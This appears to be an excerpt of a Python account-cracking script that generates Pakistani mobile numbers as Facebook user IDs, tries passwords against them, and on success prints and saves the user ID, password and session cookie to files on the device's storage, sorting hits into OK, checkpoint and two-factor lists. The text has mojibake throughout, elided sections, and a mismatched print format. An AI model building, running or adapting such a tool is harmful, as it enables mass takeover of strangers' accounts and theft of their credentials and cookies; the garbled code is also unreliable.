...
def clear():
    os.system('clear')
    print(logo)
logo =f"""â– â–‚ â–„ â–… â–† â–‡ â–ˆ ðŸŽ€ ð’œð’¹ð‘’ð‘’ð“ ðŸŽ€ â–ˆ â–‡ â–† â–… â–„ â–‚ â–
AUTHOR    : Adeel Khan
FACEBOOK : Aadii PaThan 
VERSION    : 2.0
                                   [Ø§ÙÙ†ÙŽÙ‘Ø§ Ù„ÙÙ„Ù‘Ù°ÛÙ ÙˆÙŽØ§ÙÙ†ÙŽÙ‘Ø¢ Ø§ÙÙ„ÙŽÛŒÙ’ÛÙ Ø±ÙŽØ§Ø¬ÙØ¹ÙÙˆÙ’Ù†]
(â˜â—žâ€¸â—Ÿ)â˜ž ðŸ¦‚ðŸ–¤ðŸ¦‚"""
...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESS ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
...
def Random():
    ...
    print(f"")
    print(' 0300 ,0304 ,0322 ,0333')
    print(f" 0341 ,0342 ,0345 ,0347")
    print(f" 0311 ,0316 ,0317 ,0319")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
...
def free(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[Ã¢Ë†Å¡]---------------------[Aadii-OK]--------------------[Ã¢Ë†Å¡]\nAadiiÃ°Å¸Â¦â€š : '+uid+'\nPASS   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n[Ã¢Ë†Å¡]---------------------------------------------------[Ã¢Ë†Å¡]')
                cek_apk(session,coki)
                open('/sdcard/Aadii-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ãƒâ€”]--------------------[Aadii-CP]---------------------[Ãƒâ€”]\nAadiiÃ°Å¸Â¦â€š : '+uid+'\nPASS   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\n[Ãƒâ€”]---------------------------------------------------[Ãƒâ€”]\033[1;97m')
                open('/sdcard/Aadii-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Aadii-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AadiiÃ°Å¸Â¦â€š] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
